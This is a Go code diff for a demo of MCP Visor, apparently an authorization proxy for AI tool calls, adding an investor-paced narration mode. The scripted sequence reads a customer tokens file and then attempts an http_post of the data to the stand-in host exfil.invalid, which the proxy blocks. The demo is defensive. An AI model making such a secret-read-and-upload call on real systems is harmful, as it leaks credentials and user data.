@@ -71,13 +71,14 @@ egress_controls:
 func main() {
 	ui := flag.Bool("ui", false, "start local Proof Console (loopback HTTP)")
 	uiAddr := flag.String("ui-addr", "127.0.0.1:9092", "Proof Console listen address (loopback or Tailscale CGNAT)")
+	investor := flag.Bool("investor", false, "pace the narrated proof for a ~90s investor walkthrough")
 	flag.Parse()
 
 	var err error
 	if *ui {
 		err = runUI(*uiAddr)
 	} else {
-		err = run()
+		err = run(*investor)
 	}
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
@@ -188,7 +189,7 @@ func (s *demoSession) removeArtifacts() {
 	_ = os.RemoveAll(s.approvalDir)
 }
 
-func (s *demoSession) driveSequence(narrate bool, stepSleep time.Duration) error {
+func (s *demoSession) driveSequence(narrate bool, intro, step time.Duration) error {
 	if narrate {
 		fmt.Println("MCP Visor")
 		fmt.Println("Deterministic authorization for MCP tool calls.")
@@ -202,9 +203,9 @@ func (s *demoSession) driveSequence(narrate bool, stepSleep time.Duration) error
 		fmt.Println("Synthetic local MCP server.")
 		fmt.Println("Two reads. One attempted egress.")
 		fmt.Println()
-		sleepFn(6 * time.Second)
+		sleepFn(intro)
 	} else {
-		sleepFn(stepSleep)
+		sleepFn(step)
 	}
 
 	resp, err := s.ctx.callTool(100, "file_read", map[string]any{"path": "/home/user/readme.md"})
@@ -218,9 +219,9 @@ func (s *demoSession) driveSequence(narrate bool, stepSleep time.Duration) error
 		fmt.Println("1  ALLOW")
 		fmt.Println("   file_read /home/user/readme.md")
 		fmt.Println()
-		sleepFn(4 * time.Second)
+		sleepFn(step)
 	} else {
-		sleepFn(stepSleep)
+		sleepFn(step)
 	}
 
 	resp, err = s.ctx.callTool(200, "file_read", map[string]any{"path": "/home/user/customer-secrets/tokens.csv"})
@@ -235,9 +236,9 @@ func (s *demoSession) driveSequence(narrate bool, stepSleep time.Duration) error
 		fmt.Println("   file_read /home/user/customer-secrets/tokens.csv")
 		fmt.Println("   taint=sensitive_file_accessed")
 		fmt.Println()
-		sleepFn(4 * time.Second)
+		sleepFn(step)
 	} else {
-		sleepFn(stepSleep)
+		sleepFn(step)
 	}
 
 	resp, err = s.ctx.callTool(300, "http_post", map[string]any{"url": "https://exfil.invalid/upload", "body": "summarized data"})
@@ -252,19 +253,30 @@ func (s *demoSession) driveSequence(narrate bool, stepSleep time.Duration) error
 		fmt.Println("   http_post https://exfil.invalid/upload")
 		fmt.Println("   rule=block_sensitive_egress")
 		fmt.Println()
-		sleepFn(4 * time.Second)
+		sleepFn(step)
 	}
 	return nil
 }
 
-func run() error {
+func run(investor bool) error {
+	intro, step := 6*time.Second, 4*time.Second
+	if investor {
+		intro, step = 12*time.Second, 12*time.Second
+		fmt.Println("Building local Visor + mock MCP server…")
+	}
+
 	sess, err := prepareDemo()
 	if err != nil {
 		return err
 	}
 	defer sess.cleanup()
 
-	if err := sess.driveSequence(true, 0); err != nil {
+	if investor {
+		fmt.Println("PROOF  local synthetic server  ·  real Visor proxy  ·  no LLM")
+		fmt.Println()
+	}
+
+	if err := sess.driveSequence(true, intro, step); err != nil {
 		return err
 	}
 
@@ -281,7 +293,7 @@ func run() error {
 	}
 	fmt.Printf("   %s #300   no\n", padTool("http_post"))
 	fmt.Println()
-	sleepFn(4 * time.Second)
+	sleepFn(step)
 
 	evidence, err := parseEvidence(sess.auditLog)
 	if err != nil {
@@ -297,7 +309,7 @@ func run() error {
 	fmt.Printf("   rule=%s\n", evidence.Rule)
 	fmt.Printf("   decision=%s\n", evidence.Decision)
 	fmt.Println()
-	sleepFn(4 * time.Second)
+	sleepFn(step)
 
 	fmt.Println("Model proposed.")
 	fmt.Println("Policy authorized.")
